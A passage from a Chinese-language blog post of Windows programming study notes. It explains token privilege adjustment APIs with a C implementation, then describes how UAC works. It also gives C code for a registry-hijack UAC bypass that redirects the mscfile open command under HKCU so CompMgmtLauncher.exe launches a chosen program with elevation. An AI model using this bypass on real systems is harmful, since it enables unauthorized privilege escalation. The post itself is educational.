<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">LookupPrivilegeValueA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR lpSystemName,<span class="comment">//指向以空字符结尾的字符串的指针，该字符串指定在其上检索特权名称的系统名称。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           LPCSTR lpName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PLUID  lpLuid</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<h4 id="adjusttokenprivileges">AdjustTokenPrivileges</h4>
<p>启用或禁用指定<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/a-gly">访问令牌</a>中的权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">AdjustTokenPrivileges</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            HANDLE            TokenHandle,<span class="comment">//要修改的权限的访问令牌的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            BOOL              DisableAllPrivileges,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  PTOKEN_PRIVILEGES NewState,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            DWORD             BufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PTOKEN_PRIVILEGES PreviousState,<span class="comment">//一个指向缓冲区的指针，函数用TOKEN_PRIVILEGES结构填充该结构，该结构包含函数修改的任何特权的先前状态</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PDWORD            ReturnLength<span class="comment">//PreviousState大小，字节</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<h3 id="实现-6">实现</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">enablePrivileges</span><span class="params">(HANDLE hProcess, <span class="keyword">char</span>* pszPrivilegesName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hToken = <span class="literal">NULL</span>;</span><br><span class="line">	BOOL res = FALSE;</span><br><span class="line">	LUID luidValue = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	TOKEN_PRIVILEGES tokenPrivileges = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &amp;hToken);</span><br><span class="line">	LookupPrivilegeValue(<span class="literal">NULL</span>,(LPCWSTR)pszPrivilegesName, &amp;luidValue);</span><br><span class="line">	tokenPrivileges.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">	tokenPrivileges.Privileges[<span class="number">0</span>].Luid = luidValue;</span><br><span class="line">	tokenPrivileges.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line">	res=AdjustTokenPrivileges(hToken, FALSE, &amp;tokenPrivileges, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, res);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, GetLastError());</span><br><span class="line">	<span class="keyword">if</span> (GetLastError() == ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>AdjustTokenPrivileges</code>的返回值为true也不代表特权设置成功，必须要<code>GetLastError</code>的值为<code>ERROR_SUCCESS</code>才成功，如果再程序中只提升一个访问令牌特权，且错误码为<code>ERROR_NOT_ALL_ASSIGNED</code>,则提升失败。如果程序运行再Windows 7或者以上版本的操作系统，可以尝试以管理员身份运行程序，然后再进行测试。</p>
<figure>
<img src="/2022/10/10/2022-9-WinCode1/image-20221011224037542.png" alt="image-20221011224037542"><figcaption aria-hidden="true">image-20221011224037542</figcaption>
</figure>
<h2 id="bypassuac">BypassUAC</h2>
<blockquote>
<p>UAC需要授权的动作包括：</p>
<ul>
<li>以管理员身份运行程序</li>
<li>配置<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Windows_Update">Windows Update</a></li>
<li>增加或删除用户账户</li>
<li>改变用户的账户类型</li>
<li>配置来宾（Guest）账户（Windows 7和8.1）</li>
<li>改变UAC设置</li>
<li>安装<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/ActiveX">ActiveX</a></li>
<li>安装或移除<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/计算机程序">程序</a></li>
<li>安装设备<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/驅動程式">驱动程序</a></li>
<li>设置家长控制</li>
<li>修改系统盘根目录、<strong>Program Files</strong>（x86和x64）目录或<strong>Windows</strong>目录</li>
<li>查看其他用户文件夹</li>
<li>配置文件共享或<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/流媒體">流媒体</a></li>
<li>配置家长控制面板</li>
<li>运行<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/微软管理控制台">Microsoft Management Console</a>控制台和以.msc为后缀名程序（部分.mmc程序除外）</li>
<li>运行<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/系統還原">系统还原</a>程序</li>
<li>运行<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=磁盤碎片整理&amp;action=edit&amp;redlink=1">磁盘碎片整理</a>程序</li>
<li>运行<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=註冊表編輯器&amp;action=edit&amp;redlink=1">注册表编辑器</a>或修改注册表</li>
<li>安装或卸载显示语言（Windows 7）</li>
<li>运行Windows评估程序</li>
<li>配置Windows电源程序，</li>
<li>配置Windows功能</li>
<li>运行日期和时间控制台</li>
<li>配置轻松访问</li>
<li>激活、修改产品密钥</li>
</ul>
</blockquote>
<p>在触发 UAC 时，操作系统会创建一个<code>consent.exe</code>进程，用来确定是否创建具有管理员权限的进程（通过白名单和用户选择判断），然后<code>CreateProcess</code>。请求进程将要请求的进程cmdline和进程路径，通过LPC接口传递给appinfo的<code>RAiLuanchAdminProcess</code>函数，该函数首先验证路径是否在白名单中，并将结果传递给consent.exe进程，该进程验证被请求的进程签名，以及发起者的权限，是否符合要求，然后决定是否弹出UAC框，让用户确认。这个UAC框会创建新的安全桌面，遮挡之前的界面。同时这个UAC框进程是SYSTEM账户的进程，其他标准用户进程无法与其通信交互。用户确认之后，会调用<code>CreateProcessAsUser</code>函数，以管理员权限启动请求的进程。</p>
<p>UAC Bypass方法：</p>
<ul>
<li>白名单提权</li>
<li>COM组件接口技术</li>
</ul>
<h4 id="bypass-uac-白名单提权">Bypass UAC-白名单提权</h4>
<p>使用进程监控工具：<code>Procmon.exe</code>，监控<code>CompMgmtLauncher.exe</code></p>
<p><code>CompMgmtLauncher.exe</code>进程会先查询注册表<code>HKCU\Software\Classes\mscfile\shell\open\command</code>中的数据，发现该路路径不存在后，继续查询注册表<code>HKCR\mscfile\shell\open\command(Default)</code>中的数据并读取，该注册表路径中存储着mmc.exe进程的路径信息。</p>
<p>可以在<code>HKCU\Software\Classes\mscfile\shell\open\command(Default)</code>写入自定义路径，实现代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">setReg</span><span class="params">(<span class="keyword">char</span>* lpzEXEpath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HKEY hKey = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 创建项</span></span><br><span class="line">	RegCreateKeyEx(HKEY_CURRENT_USER, (LPCWSTR)<span class="string">&quot;Software\\Classes\\mscfile\\Shell\\Open\\Command&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, KEY_WOW64_64KEY | KEY_ALL_ACCESS, <span class="literal">NULL</span>, &amp;hKey, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// 设置键值</span></span><br><span class="line">	RegSetValueEx(hKey, <span class="literal">NULL</span>, <span class="number">0</span>, REG_SZ, (BYTE*)lpzEXEpath, (<span class="number">1</span> + lstrlen((LPCWSTR)lpzEXEpath)));</span><br><span class="line">	<span class="comment">// 关闭注册表</span></span><br><span class="line">	RegCloseKey(hKey);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="隐藏技术">隐藏技术</h1>

                                                                    </div>
                                                                    
                                                                        <div class="prev-or-next">
                                                                            <div class="post-foot-next">
                                                                                
                                                                                    <a href="/2022/10/05/2022-10-HTTP/" target="_self">
                                                                                        <i class="iconfont icon-chevronleft"></i>
                                                                                        <span>Prev</span>
                                                                                    </a>
                                                                                    
                                                                            </div>
                                                                            <div class="post-attach">
                                                                                <!-- <span class="post-pubtime">
              <i class="iconfont icon-updatetime" title="Update time"></i>
              2022-10-10
            </span> -->

                                                                                
                                                                                            <span class="post-categories">
          <!-- <i class="iconfont icon-bookmark" title="Categories"></i> -->
          
          <!-- <span class="span--category">
            <a href="/categories/Technology/" title="Technology">
              <b>#</b> Technology
            </a>
          </span> -->
                                                                                            
                                                                                                </span>
                                                                                                
                                                                                    <span class="post-tags">
          <!-- <i class="iconfont icon-tags" title="Tags"></i> -->
          
          <!-- <span class="span--tag">
            <a href="/tags/Win32/" title="Win32">
              <b>#</b> Win32
            </a>
          </span> -->
                                                                                    
                                                                                        </span>
                                                                                        
                                                                            </div>
                                                                            <div class="post-foot-prev">
                                                                                
                                                                                    <a href="/2099/12/31/TOP/" target="_self">
                                                                                        <span>Next</span>
                                                                                        <i class="iconfont icon-chevronright"></i>
                                                                                    </a>
                                                                                    
                                                                            </div>
                                                                        </div>
                                                                        
                                                                </div>
                                                                
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">Contents</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%95%E4%B8%80%E5%AE%9E%E4%BE%8B"><span class="toc-text">单一实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#createmutexa"><span class="toc-text">CreateMutexA</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-text">注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90"><span class="toc-text">全局钩子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#api"><span class="toc-text">API</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#setwindowshookexa"><span class="toc-text">SetWindowsHookExA</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0"><span class="toc-text">实现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5dll"><span class="toc-text">远程线程注入DLL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#api-1"><span class="toc-text">API</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#openprocess"><span class="toc-text">OpenProcess</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#virtualallocex"><span class="toc-text">VirtualAllocEx</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeprocessmemory"><span class="toc-text">WriteProcessMemory</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#createremotethread"><span class="toc-text">CreateRemoteThread</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0-1"><span class="toc-text">实现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4session-0%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">突破SESSION 0隔离的远线程注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#api-2"><span class="toc-text">API</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zwcreatethreadex"><span class="toc-text">ZwCreateThreadEx</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0-2"><span class="toc-text">实现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apc%E6%B3%A8%E5%85%A5%E6%9C%AA%E5%AE%8C%E6%88%90"><span class="toc-text">APC注入(未完成)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#api-3"><span class="toc-text">API</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#queueuserapc"><span class="toc-text">QueueUserAPC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#createtoolhelp32snapshot"><span class="toc-text">CreateToolhelp32Snapshot</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#process32first"><span class="toc-text">Process32First</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0-3"><span class="toc-text">实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8"><span class="toc-text">启动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8Bapi"><span class="toc-text">创建进程API</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#api-4"><span class="toc-text">API</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#winexec"><span class="toc-text">WinExec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellexecutea"><span class="toc-text">ShellExecuteA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#createprocessa"><span class="toc-text">CreateProcessA</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0-4"><span class="toc-text">实现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4session-0%E9%9A%94%E7%A6%BB%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E8%BF%9B%E7%A8%8B"><span class="toc-text">突破SESSION 0隔离创建用户进程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#api-5"><span class="toc-text">API</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wtsgetactiveconsolesessionid"><span class="toc-text">WTSGetActiveConsoleSessionId</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wtsqueryusertoken"><span class="toc-text">WTSQueryUserToken</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#duplicatetokenex"><span class="toc-text">DuplicateTokenEx</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#createenvironmentblock"><span class="toc-text">CreateEnvironmentBlock</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#createprocessasusera"><span class="toc-text">CreateProcessAsUserA</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0-5"><span class="toc-text">实现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%9C%AA%E5%AE%8C%E6%88%90"><span class="toc-text">内存加载执行(未完成)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AFbypass-uac%E9%83%A8%E5%88%86%E6%9C%AA%E5%AE%8C%E6%88%90"><span class="toc-text">提权技术(Bypass UAC部分未完成)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">进程访问令牌权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#api-6"><span class="toc-text">API</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#openprocesstoken"><span class="toc-text">OpenProcessToken</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lookupprivilegevalue"><span class="toc-text">LookupPrivilegeValue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#adjusttokenprivileges"><span class="toc-text">AdjustTokenPrivileges</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0-6"><span class="toc-text">实现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypassuac"><span class="toc-text">BypassUAC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass-uac-%E7%99%BD%E5%90%8D%E5%8D%95%E6%8F%90%E6%9D%83"><span class="toc-text">Bypass UAC-白名单提权</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF"><span class="toc-text">隐藏技术</span></a></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




                                                                    
                                                                        <div class="comments-container">
                                                                            







                                                                        </div>
                                                                        
                                                            </div>
                                                            
        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/Ghostasky">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
        <li>
          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ghostasky">
            <i class="iconfont icon-twitter"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/Ghostasky">怕什么真理无穷，进一寸有进一寸的欢喜。</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="Search...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Windows%20Program%20Learn_0x1 + '&url=' + https%3A%2F%2Fghostasky.github.io%2F2022%2F10%2F10%2F2022-9-WinCode1%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ghostasky.github.io/2022/10/10/2022-9-WinCode1/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
